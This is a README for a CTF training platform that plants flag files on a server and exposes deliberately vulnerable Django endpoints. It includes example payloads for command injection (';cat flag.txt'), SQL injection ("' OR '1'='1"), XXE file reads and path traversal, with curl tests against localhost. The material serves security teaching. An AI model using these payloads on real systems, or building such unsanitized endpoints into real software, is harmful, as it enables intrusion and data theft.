# Server-Side Flag Discovery System

## Overview
This system allows you to create CTF challenges where flags are hidden on the server and users must discover them through various exploitation techniques.

## Setup

### Create Server-Side Flag Challenge
```bash
python manage.py setup_server_flags
```

This creates:
- A challenge with ID (e.g., 22)
- Multiple flag files on the server
- Vulnerable endpoints for exploitation

## Flag Storage Types

### 1. Regular File
```python
ServerFlagManager.create_flag_file(challenge_id, 'CTF{flag}', 'flag.txt')
```
- Stored in: `server_flags/challenge_{id}/flag.txt`
- Access: `/challenges/vulnerable/{id}/read?file=flag.txt`

### 2. Hidden File
```python
ServerFlagManager.create_flag_file(challenge_id, 'CTF{flag}', 'secret.txt', hidden=True)
```
- Stored as: `.secret.txt` (hidden file)
- Requires directory listing to discover

### 3. Backup File
```python
ServerFlagManager.create_backup_file(challenge_id, 'CTF{flag}')
```
- Stored as: `backup.txt.bak`
- Common misconfiguration

### 4. Git Exposed
```python
ServerFlagManager.create_git_exposed_flag(challenge_id, 'CTF{flag}')
```
- Stored in: `.git/logs/HEAD`
- Simulates exposed git repository

### 5. Source Code Comments
```python
ServerFlagManager.create_source_code_flag(challenge_id, 'CTF{flag}')
```
- Flag in Python source comments
- Stored in: `app.py`

## Vulnerable Endpoints

### 1. Path Traversal (`/read`)
**Vulnerability**: No path sanitization

**Exploit**:
```
/challenges/vulnerable/22/read?file=flag.txt
/challenges/vulnerable/22/read?file=.secret_flag.txt
/challenges/vulnerable/22/read?file=.git/logs/HEAD
```

### 2. Directory Listing (`/files`)
**Vulnerability**: Directory browsing enabled

**Exploit**:
```
/challenges/vulnerable/22/files
```
Lists all files including hidden ones.

### 3. Command Injection (`/ping`)
**Vulnerability**: Unsanitized shell command execution

**Exploit**:
```
/challenges/vulnerable/22/ping?host=localhost; cat flag.txt
/challenges/vulnerable/22/ping?host=localhost | ls -la
/challenges/vulnerable/22/ping?host=localhost && cat .secret_flag.txt
```

### 4. SQL Injection (`/login`)
**Vulnerability**: SQL injection in login form

**Exploit**:
```
/challenges/vulnerable/22/login?username=admin' OR '1'='1
/challenges/vulnerable/22/login?password=' OR '1'='1
```

### 5. XXE Injection (`/xml`)
**Vulnerability**: XML External Entity processing

**Exploit**:
```xml
POST /challenges/vulnerable/22/xml
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<root>&xxe;</root>
```

### 6. Information Disclosure (`/debug`)
**Vulnerability**: Debug info exposed

**Exploit**:
```
/challenges/vulnerable/22/debug?action=debug
/challenges/vulnerable/22/debug?action=error
```

### 7. Robots.txt Leak (`/robots.txt`)
**Vulnerability**: Sensitive info in robots.txt

**Exploit**:
```
/challenges/vulnerable/22/robots.txt
```

## Creating Custom Challenges

### Example 1: File Discovery Challenge
```python
from challenges.server_flags import ServerFlagManager

challenge_id = 22
flag = 'CTF{found_the_backup}'

# Create backup file
ServerFlagManager.create_backup_file(challenge_id, flag)
```

**Challenge Description**:
```
The developer left a backup file on the server.
Can you find it?

Hint: Backup files often have .bak extension
```

### Example 2: Git Exposure Challenge
```python
ServerFlagManager.create_git_exposed_flag(challenge_id, 'CTF{git_exposed}')
```

**Challenge Description**:
```
The .git directory is exposed!
Explore the git history to find the flag.

Hint: Check git logs
```

### Example 3: Command Injection Challenge
```python
ServerFlagManager.create_flag_file(challenge_id, 'CTF{command_injection}', 'flag.txt')
```

**Challenge Description**:
```
This ping utility has a security flaw.
Can you exploit it to read the flag?

URL: /challenges/vulnerable/{id}/ping
Hint: Try chaining commands
```

## Security Notes

⚠️ **IMPORTANT**: These endpoints are INTENTIONALLY vulnerable!

### Safety Measures:
1. **Isolated Directory**: Flags stored in `server_flags/` directory
2. **Restricted Permissions**: Flag files are read-only (chmod 400)
3. **No Real Data**: Don't store real sensitive information
4. **Development Only**: Disable in production

### Production Deployment:
```python
# In settings.py
if not DEBUG:
    # Disable vulnerable endpoints
    ENABLE_VULNERABLE_ENDPOINTS = False
```

## Testing

### Test Path Traversal:
```bash
curl "http://localhost:8000/challenges/vulnerable/22/read?file=flag.txt"
```

### Test Directory Listing:
```bash
curl "http://localhost:8000/challenges/vulnerable/22/files"
```

### Test Command Injection:
```bash
curl "http://localhost:8000/challenges/vulnerable/22/ping?host=localhost;cat%20flag.txt"
```

### Test SQL Injection:
```bash
curl "http://localhost:8000/challenges/vulnerable/22/login?username=admin'%20OR%20'1'='1"
```

## Challenge Ideas

### Beginner:
1. **Robots.txt Discovery**: Flag in robots.txt
2. **Backup File**: Find .bak file
3. **Directory Listing**: Browse files to find flag

### Intermediate:
4. **Path Traversal**: Navigate directories to find flag
5. **SQL Injection**: Bypass login to get flag
6. **Source Code Leak**: Find flag in comments

### Advanced:
7. **Command Injection**: Chain commands to read flag
8. **XXE Injection**: Use XML to read files
9. **Git Exposure**: Extract flag from git history
10. **Blind Command Injection**: Exfiltrate flag without direct output

## File Structure

```
server_flags/
├── .gitignore
└── challenge_22/
    ├── flag.txt
    ├── .secret_flag.txt
    ├── backup.txt.bak
    ├── app.py
    └── .git/
        └── logs/
            └── HEAD
```

## API Reference

### ServerFlagManager Methods

```python
# Setup
ServerFlagManager.setup_flag_directory()

# Create flags
ServerFlagManager.create_flag_file(challenge_id, flag, filename, hidden=False)
ServerFlagManager.create_backup_file(challenge_id, flag)
ServerFlagManager.create_git_exposed_flag(challenge_id, flag)
ServerFlagManager.create_source_code_flag(challenge_id, flag)

# Read flags
ServerFlagManager.read_flag(challenge_id, filename='flag.txt')
ServerFlagManager.get_flag_path(challenge_id, filename)
ServerFlagManager.list_challenge_files(challenge_id)
```

## Troubleshooting

### Flags not found?
```bash
# Check if files exist
ls -la server_flags/challenge_22/

# Check permissions
ls -l server_flags/challenge_22/flag.txt
```

### Endpoints not working?
```bash
# Verify URLs are registered
python manage.py show_urls | grep vulnerable
```

### Command injection not working?
- Check if subprocess is allowed
- Verify challenge directory exists
- Check file permissions

## Best Practices

1. **Clear Instructions**: Tell users which endpoint to target
2. **Progressive Hints**: Start with easy, get harder
3. **Multiple Paths**: Allow different exploitation methods
4. **Realistic Scenarios**: Base on real vulnerabilities
5. **Educational Value**: Explain the vulnerability after solving

## Example Challenge Workflow

1. **Create Challenge** in Django admin
2. **Run setup command**: `python manage.py setup_server_flags`
3. **Update description** with vulnerable endpoint URL
4. **Add hints** about the vulnerability type
5. **Test exploits** to ensure they work
6. **Activate challenge** for users

---

Happy hacking! 🚩
